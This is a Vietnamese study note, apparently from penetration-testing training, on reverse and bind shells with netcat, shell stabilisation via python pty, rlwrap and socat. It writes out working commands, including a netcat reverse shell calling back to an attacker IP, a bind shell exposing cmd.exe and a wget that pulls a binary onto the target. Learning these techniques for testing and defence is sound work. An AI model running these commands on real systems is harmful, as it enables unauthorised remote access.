<h1>Shell</h1>

Về cơ bản shell là một giao diện để tương tác với CLI của OS như bash hoặc sh trong Linux, cmd.exe hoặc Powershell trong Windows\
Có 2 dạng shell cơ bản thường được sử dụng trong tấn công,\
reverse shell sử dụng để giúp hacker có quyền access đến command line\
bind shell sử dụng để mỏe port trên server mà hacker có thể kết nối tới\

<h2>Tools</h2>

Một số tool thường được sử dụng để tương tác với shell bao gồm:\
**Netcat\
Socat\
Metasploit --multi/handler\
Msfvenom**

<h2>Types of Shell</h2>

Như đã nói ở trên, 2 loại Shell chính được dùng trong tấn công là: **Reversel Shells** và **Bind Shells**\
>**Reverse Shells** được sử dụng để buộc mục tiêu phải thực hiện kết nối ngược lại về máy của kẻ tấn công. Và trên máy tấn công sẽ sử dụng các tools liệt kê ở mục 2 để lắng nghe các kết nối gọi về.
>Đây là một cách thức sử dụng để bypass firewall rule.\
>**Bind Shells** được sử dụng để mở cổng trên máy mục tiêu và kẻ tấn công sẽ kết nối tới cổng này để thực hiện các hành vi của mình.
>Điểm yếu của shell này là có thể bị tường lửa chặn.

VD về Shell:\
**Reverse Shells**\
Trên máy tấn công:
```console
sudo nc -lvnp 443
```
Trên máy mục tiêu:
```console
nc <Local_IP> <Port> -e /bin/bash
```
![image](https://user-images.githubusercontent.com/95600382/149742730-750f251d-8cbf-4d10-945e-5e84933c86e4.png)\
**Bind Shells**\
Trên máy mục tiêu:
```console
nc -lvnp <port> -e "cmd.exe"
```
Trên máy tấn công:
```console
nc MACHINE_IP <port>
```
![image](https://user-images.githubusercontent.com/95600382/149743149-7f919a1c-81e4-483c-84fe-8e687bdfadc1.png)\
Shell có 2 loại tương tác *interactive* và *non-interactive*:\
Interactive: Shell này sẽ tương tác với các chương trình có trên máy đích sau khi được thực thi. VD:\
![image](https://user-images.githubusercontent.com/95600382/149744064-e33674f7-1a82-4a36-b347-a37ac7dc8cb6.png)\
Non-Interactive: Đơn giản hơn nhưng nó sẽ khó để thực hiện khai thác hơn. VD:\
![image](https://user-images.githubusercontent.com/95600382/149744218-678e2251-a0d6-4a14-b77c-e0cbd8b81b3a.png)\

<h2>Netcat</h2>

Câu lệnh sử dụng netcat để lắng nghe trên Linux:\
*Revesel Shells*
```console
nc -lvnp <port-number>
```
Trong đó:\
-l: set netcat là listener\
-v: verbose\
-n: k sử dụng DNS\
-p: port\
*Bind Shells*
```console
nc <target-ip> <chosen-port>
```
<h2>Netcat Shell Stabilisation</h2>

*C1: Sử dụng Python để tunning Shell*\
Áp dụng cho Linux vì Python gần như luôn được cài đặt mặc định. Có 3 bước để áp dụng:\
1. Sử dụng `python -c 'import pty;pty.spawn("/bin/bash")'` để import thư viện pty và chạy lệnh sau ;
2. `export TERM=xterm` cho phép sử dụng các term command như clear
3. Sử dụng Ctrl + Z để khiến shell chạy ngầm. Quay trở lại giao diện sử dụng `stty raw -echo; fg` để xác thực kết nối lại vào shell
VD:\
![image](https://user-images.githubusercontent.com/95600382/149748187-9e596b74-2f8b-46dc-bbda-f4f47bf98e1e.png)\
*C2: Sử dụng rlwrap*\
Note: rlwrap không được cài đặt mặc định trên Kali. `sudo apt install rlwrap`\
Lệnh sử dụng:
```console
rlwrap nc -lvnp <port>
```
Đây là một kỹ thuật sử dụng tốt cho các Windows Shell.
*C3: Socat*\
Note: Kỹ thuật này chỉ áp dụng cho Linux. Để thực hiện kỹ thuật này trc tiên chúng ta cần up một file `socat static compiled binary` lên mục tiêu.\
Cách dễ nhất là host một server với python:\
```console
sudo python3 -m http.server 80
wget <LOCAL-IP>/socat -O /tmp/socat (hoặc curl)
```

